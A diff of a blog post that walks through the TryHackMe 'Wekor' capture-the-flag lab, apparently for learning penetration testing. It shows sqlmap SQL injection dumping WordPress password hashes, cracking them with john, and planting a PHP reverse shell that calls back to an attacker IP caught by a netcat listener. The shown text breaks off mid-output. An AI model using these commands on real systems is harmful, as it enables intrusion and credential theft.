@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Wekor [TryHackMe] – Blog</title>
+    <title>Wekor [TryHackMe] – Martin Kubecka | Blog</title>
     
 
 
@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>
+<script defer src="/js/helper/fadeinout.min.3ce954c8aea3b69cc5e6f734d8273ba4cd48d3a7987dbdca145849bc4b8fc296.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1335,7 +1335,7 @@
 <meta name="author" content="Martin Kubecka">
 
 
-<meta property="og:site_name" content="Blog">
+<meta property="og:site_name" content="Martin Kubecka | Blog">
 <meta property="og:title" content="Wekor [TryHackMe]">
 <meta property="og:url" content="https://martinkubecka.github.io/posts/thm/wekor/">
 <meta property="og:type" content="article">
@@ -1345,12 +1345,12 @@
     <meta property="og:image" content="https://martinkubecka.github.io/images/thm/wekor/icon.jpeg">
     <meta property="og:image:url" content="https://martinkubecka.github.io/images/thm/wekor/icon.jpeg">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:app:name:iphone" content="Blog">
+    <meta name="twitter:app:name:iphone" content="Martin Kubecka | Blog">
     <meta property="twitter:title" content="Wekor [TryHackMe]">
     <meta property="twitter:description" content="CTF challenge involving Sqli, WordPress, vhost enumeration and recognizing internal services.">
   
 
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.93.3" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1398,7 +1398,7 @@
     },
     "publisher": {
       "@type": "Organization",
-      "name": "Blog",
+      "name": "Martin Kubecka | Blog",
       "url": "https://martinkubecka.github.io/"
     }
   }
@@ -1690,7 +1690,7 @@
   
   <li >
     
-      <a href="https://martinkubecka.github.io/" class="capitalize">Blog</a>
+      <a href="https://martinkubecka.github.io/" class="capitalize">Martin Kubecka | Blog</a>
     
   </li>
   
@@ -1818,7 +1818,7 @@
 The output of the scan can be seen below:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1829,16 +1829,16 @@ The output of the scan can be seen below:</p>
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">nmap -sS -sV -T4 wekor.thm
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-09 11:30 CST
-Nmap scan report <span class="k">for</span> wekor.thm <span class="o">(</span>10.10.14.2<span class="o">)</span>
-Host is up <span class="o">(</span>0.073s latency<span class="o">)</span>.
-Not shown: <span class="m">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap -sS -sV -T4 wekor.thm
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-09 11:30 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> wekor.thm <span class="o">(</span>10.10.14.2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.073s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><figure >
   
@@ -1855,7 +1855,7 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 <p>Visiting the <code>robots.txt</code>, we get many different directory paths.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1867,17 +1867,17 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">User-agent: *
-Disallow: /workshop/
-Disallow: /root/
-Disallow: /lol/
-Disallow: /agent/
-Disallow: /feed
-Disallow: /crawler
-Disallow: /boot
-Disallow: /comingreallysoon
-Disallow: /interesting
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">User-agent: *
+</span></span><span class="line"><span class="cl">Disallow: /workshop/
+</span></span><span class="line"><span class="cl">Disallow: /root/
+</span></span><span class="line"><span class="cl">Disallow: /lol/
+</span></span><span class="line"><span class="cl">Disallow: /agent/
+</span></span><span class="line"><span class="cl">Disallow: /feed
+</span></span><span class="line"><span class="cl">Disallow: /crawler
+</span></span><span class="line"><span class="cl">Disallow: /boot
+</span></span><span class="line"><span class="cl">Disallow: /comingreallysoon
+</span></span><span class="line"><span class="cl">Disallow: /interesting
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Visiting these directories redirect us to 404 (Not Found), except <code>/comingreallysoon</code>. Navigating to this location, we will find a message which contains a path to the actual website.</p>
 <blockquote>
@@ -1911,7 +1911,7 @@ Disallow: /interesting
 <p>Before running <strong>sqlmap</strong>, start Burp Suite and intercept the request for applying coupon code. Here we are looking for variables and their values, which we will then use for <code>--data</code> flag.  To list available databases, we will add <code>--dbs</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1925,24 +1925,24 @@ Disallow: /interesting
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">sqlmap -u http://wekor.thm/it-next/it_cart.php --data<span class="o">=</span><span class="s2">&#34;coupon_code=&amp;apply_coupon=Apply%20Coupon&#34;</span> --dbs
-
-. . .
-
-<span class="o">[</span>12:05:25<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching database names
-available databases <span class="o">[</span>6<span class="o">]</span>:
-<span class="o">[</span>*<span class="o">]</span> coupons
-<span class="o">[</span>*<span class="o">]</span> information_schema
-<span class="o">[</span>*<span class="o">]</span> mysql
-<span class="o">[</span>*<span class="o">]</span> performance_schema
-<span class="o">[</span>*<span class="o">]</span> sys
-<span class="o">[</span>*<span class="o">]</span> wordpress
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sqlmap -u http://wekor.thm/it-next/it_cart.php --data<span class="o">=</span><span class="s2">&#34;coupon_code=&amp;apply_coupon=Apply%20Coupon&#34;</span> --dbs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">. . .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:05:25<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching database names
+</span></span><span class="line"><span class="cl">available databases <span class="o">[</span>6<span class="o">]</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> coupons
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> information_schema
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> mysql
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> performance_schema
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> sys
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> wordpress
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Let us proceed with findings and list tables for this database with <code>--tables</code> flag.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1967,35 +1967,35 @@ available databases <span class="o">[</span>6<span class="o">]</span>:
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">sqlmap -u http://wekor.thm/it-next/it_cart.php --data<span class="o">=</span><span class="s2">&#34;coupon_code=&amp;apply_coupon=Apply%20Coupon&#34;</span> -D wordpress --tables
-
-. . .
-
-<span class="o">[</span>12:08:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
-back-end DBMS: MySQL <span class="m">5</span>
-<span class="o">[</span>12:08:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="s1">&#39;wordpress&#39;</span>
-Database: wordpress
-<span class="o">[</span><span class="m">12</span> tables<span class="o">]</span>
-+-----------------------+
-<span class="p">|</span> wp_commentmeta        <span class="p">|</span>
-<span class="p">|</span> wp_comments           <span class="p">|</span>
-<span class="p">|</span> wp_links              <span class="p">|</span>
-<span class="p">|</span> wp_options            <span class="p">|</span>
-<span class="p">|</span> wp_postmeta           <span class="p">|</span>
-<span class="p">|</span> wp_posts              <span class="p">|</span>
-<span class="p">|</span> wp_term_relationships <span class="p">|</span>
-<span class="p">|</span> wp_term_taxonomy      <span class="p">|</span>
-<span class="p">|</span> wp_termmeta           <span class="p">|</span>
-<span class="p">|</span> wp_terms              <span class="p">|</span>
-<span class="p">|</span> wp_usermeta           <span class="p">|</span>
-<span class="p">|</span> wp_users              <span class="p">|</span>
-+-----------------------+
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sqlmap -u http://wekor.thm/it-next/it_cart.php --data<span class="o">=</span><span class="s2">&#34;coupon_code=&amp;apply_coupon=Apply%20Coupon&#34;</span> -D wordpress --tables
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">. . .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:08:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+</span></span><span class="line"><span class="cl">back-end DBMS: MySQL <span class="m">5</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>12:08:58<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="s1">&#39;wordpress&#39;</span>
+</span></span><span class="line"><span class="cl">Database: wordpress
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">12</span> tables<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+-----------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_commentmeta        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_comments           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_links              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_options            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_postmeta           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_posts              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_term_relationships <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_term_taxonomy      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_termmeta           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_terms              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_usermeta           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> wp_users              <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-----------------------+
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Dumping credentials with <code>--dump</code>, we will obtain four user names and their password hashes.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2012,22 +2012,22 @@ Database: wordpress
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">sqlmap -u http://wekor.thm/it-next/it_cart.php --data<span class="o">=</span><span class="s2">&#34;coupon_code=&amp;apply_coupon=Apply%20Coupon&#34;</span> -D wordpress -T wp_users --dump
-
-. . .
-
-Database: wordpress
-Table: wp_users
-<span class="o">[</span><span class="m">4</span> entries<span class="o">]</span>
-+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
-<span class="p">|</span> ID   <span class="p">|</span> user_url                        <span class="p">|</span> user_pass                          <span class="p">|</span> user_email        <span class="p">|</span> user_login <span class="p">|</span> user_status <span class="p">|</span> display_name <span class="p">|</span> user_nicename <span class="p">|</span> user_registered     <span class="p">|</span> user_activation_key                           <span class="p">|</span>
-+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
-<span class="p">|</span> <span class="m">1</span>    <span class="p">|</span> http://site.wekor.thm/wordpress <span class="p">|</span> <span class="nv">$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B</span>. <span class="p">|</span> admin@wekor.thm   <span class="p">|</span> admin      <span class="p">|</span> <span class="m">0</span>           <span class="p">|</span> admin        <span class="p">|</span> admin         <span class="p">|</span> 2021-01-21 20:33:37 <span class="p">|</span> &lt;blank&gt;                                       <span class="p">|</span>
-<span class="p">|</span> <span class="m">5743</span> <span class="p">|</span> http://jeffrey.com              <span class="p">|</span> <span class="nv">$P$BU8QpWD</span>.kHZv3Vd1r52ibmO913hmj10 <span class="p">|</span> jeffrey@wekor.thm <span class="p">|</span> wp_jeffrey <span class="p">|</span> <span class="m">0</span>           <span class="p">|</span> wp jeffrey   <span class="p">|</span> wp_jeffrey    <span class="p">|</span> 2021-01-21 20:34:50 <span class="p">|</span> 1611261290:<span class="nv">$P$BufzJsT0fhM94swehg1bpDVTupoxPE0</span> <span class="p">|</span>
-<span class="p">|</span> <span class="m">5773</span> <span class="p">|</span> http://yura.com                 <span class="p">|</span> <span class="nv">$P$B6jSC3m7WdMlLi1</span>/NDb3OFhqv536SV/ <span class="p">|</span> yura@wekor.thm    <span class="p">|</span> wp_yura    <span class="p">|</span> <span class="m">0</span>           <span class="p">|</span> wp yura      <span class="p">|</span> wp_yura       <span class="p">|</span> 2021-01-21 20:35:27 <span class="p">|</span> &lt;blank&gt;                                       <span class="p">|</span>
-<span class="p">|</span> <span class="m">5873</span> <span class="p">|</span> http://eagle.com                <span class="p">|</span> <span class="nv">$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY</span>/ <span class="p">|</span> eagle@wekor.thm   <span class="p">|</span> wp_eagle   <span class="p">|</span> <span class="m">0</span>           <span class="p">|</span> wp eagle     <span class="p">|</span> wp_eagle      <span class="p">|</span> 2021-01-21 20:36:11 <span class="p">|</span> &lt;blank&gt;                                       <span class="p">|</span>
-+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sqlmap -u http://wekor.thm/it-next/it_cart.php --data<span class="o">=</span><span class="s2">&#34;coupon_code=&amp;apply_coupon=Apply%20Coupon&#34;</span> -D wordpress -T wp_users --dump
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">. . .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database: wordpress
+</span></span><span class="line"><span class="cl">Table: wp_users
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">4</span> entries<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ID   <span class="p">|</span> user_url                        <span class="p">|</span> user_pass                          <span class="p">|</span> user_email        <span class="p">|</span> user_login <span class="p">|</span> user_status <span class="p">|</span> display_name <span class="p">|</span> user_nicename <span class="p">|</span> user_registered     <span class="p">|</span> user_activation_key                           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">1</span>    <span class="p">|</span> http://site.wekor.thm/wordpress <span class="p">|</span> <span class="nv">$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B</span>. <span class="p">|</span> admin@wekor.thm   <span class="p">|</span> admin      <span class="p">|</span> <span class="m">0</span>           <span class="p">|</span> admin        <span class="p">|</span> admin         <span class="p">|</span> 2021-01-21 20:33:37 <span class="p">|</span> &lt;blank&gt;                                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">5743</span> <span class="p">|</span> http://jeffrey.com              <span class="p">|</span> <span class="nv">$P$BU8QpWD</span>.kHZv3Vd1r52ibmO913hmj10 <span class="p">|</span> jeffrey@wekor.thm <span class="p">|</span> wp_jeffrey <span class="p">|</span> <span class="m">0</span>           <span class="p">|</span> wp jeffrey   <span class="p">|</span> wp_jeffrey    <span class="p">|</span> 2021-01-21 20:34:50 <span class="p">|</span> 1611261290:<span class="nv">$P$BufzJsT0fhM94swehg1bpDVTupoxPE0</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">5773</span> <span class="p">|</span> http://yura.com                 <span class="p">|</span> <span class="nv">$P$B6jSC3m7WdMlLi1</span>/NDb3OFhqv536SV/ <span class="p">|</span> yura@wekor.thm    <span class="p">|</span> wp_yura    <span class="p">|</span> <span class="m">0</span>           <span class="p">|</span> wp yura      <span class="p">|</span> wp_yura       <span class="p">|</span> 2021-01-21 20:35:27 <span class="p">|</span> &lt;blank&gt;                                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">5873</span> <span class="p">|</span> http://eagle.com                <span class="p">|</span> <span class="nv">$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY</span>/ <span class="p">|</span> eagle@wekor.thm   <span class="p">|</span> wp_eagle   <span class="p">|</span> <span class="m">0</span>           <span class="p">|</span> wp eagle     <span class="p">|</span> wp_eagle      <span class="p">|</span> 2021-01-21 20:36:11 <span class="p">|</span> &lt;blank&gt;                                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Also notice a new subdomain under admin in the <em>user_url</em> column. We will add <code>site.wekor.thm</code> to our <code>/etc/hosts</code>. Based on the <code>wordpress</code> database name, we can assume that the found website is actually build with WordPress.</p>
 <blockquote>
@@ -2035,17 +2035,17 @@ Table: wp_users
 When looking for <strong>Virtual Host</strong> use <strong>gobuster</strong> with <strong>vhost</strong> mode.</em></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">gobuster vhost -u wekor.thm -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster vhost -u wekor.thm -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div></blockquote>
 <p>To crack found hashes, we will need to save them into a file and then provide it to <strong>john</strong> with wordlist of your choice.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2056,16 +2056,16 @@ When looking for <strong>Virtual Host</strong> use <strong>gobuster</strong> wit
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">john wordpress-hashes --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt 
-Using default input encoding: UTF-8
-Loaded <span class="m">4</span> password hashes with <span class="m">4</span> different salts <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P</span>$ or <span class="nv">$H</span>$<span class="o">)</span> 128/128 AVX 4x3<span class="o">])</span>
-Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">8192</span> <span class="k">for</span> all loaded hashes
-Will run <span class="m">2</span> OpenMP threads
-Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
-rockyou          <span class="o">(</span>wp_jeffrey<span class="o">)</span>
-xxxxxx           <span class="o">(</span>wp_eagle<span class="o">)</span>
-soccer13         <span class="o">(</span>wp_yura<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">john wordpress-hashes --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">4</span> password hashes with <span class="m">4</span> different salts <span class="o">(</span>phpass <span class="o">[</span>phpass <span class="o">(</span><span class="nv">$P</span>$ or <span class="nv">$H</span>$<span class="o">)</span> 128/128 AVX 4x3<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">8192</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">rockyou          <span class="o">(</span>wp_jeffrey<span class="o">)</span>
+</span></span><span class="line"><span class="cl">xxxxxx           <span class="o">(</span>wp_eagle<span class="o">)</span>
+</span></span><span class="line"><span class="cl">soccer13         <span class="o">(</span>wp_yura<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><hr />
 <h2 id="wordpress">Wordpress</h2>
@@ -2079,13 +2079,13 @@ soccer13         <span class="o">(</span>wp_yura<span class="o">)</span>
 <p>We will choose <strong>404.php</strong> and replace it with <a href="https://github.com/pentestmonkey/php-reverse-shell">php reverse shell</a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;10.9.140.180&#39;</span><span class="p">;</span>  <span class="c1">// CHANGE THIS
-</span><span class="c1"></span><span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>       <span class="c1">// CHANGE THIS
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;10.9.140.180&#39;</span><span class="p">;</span>  <span class="c1">// CHANGE THIS
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>       <span class="c1">// CHANGE THIS
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Pressing <strong>Update File</strong> button, <strong>404.php</strong> content will be replace with our malicious reverse shell.<br />
 Before visiting updated php file, don’t forget to start a listener on your local machine.</p>
@@ -2093,7 +2093,7 @@ Before visiting updated php file, don’t forget to start a listener on your loc
 <p><code>http://site.wekor.thm/wordpress/index.php/whatever</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2107,36 +2107,36 @@ Before visiting updated php file, don’t forget to start a listener on your loc
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">nc -lnvp <span class="m">4444</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
-connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.14.2<span class="o">]</span> <span class="m">43880</span>
-Linux osboxes 4.15.0-133-generic <span class="c1">#137~16.04.1-Ubuntu SMP Fri Jan 15 02:55:05 UTC 2021 i686 i686 i686 GNU/Linux</span>
- 13:25:49 up  1:15,  <span class="m">0</span> users,  load average: 0.01, 0.02, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
-$ whoami<span class="p">;</span>id<span class="p">;</span>hostname
-www-data
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-osboxes
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lnvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.14.2<span class="o">]</span> <span class="m">43880</span>
+</span></span><span class="line"><span class="cl">Linux osboxes 4.15.0-133-generic <span class="c1">#137~16.04.1-Ubuntu SMP Fri Jan 15 02:55:05 UTC 2021 i686 i686 i686 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 13:25:49 up  1:15,  <span class="m">0</span> users,  load average: 0.01, 0.02, 0.00
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ whoami<span class="p">;</span>id<span class="p">;</span>hostname
+</span></span><span class="line"><span class="cl">www-data
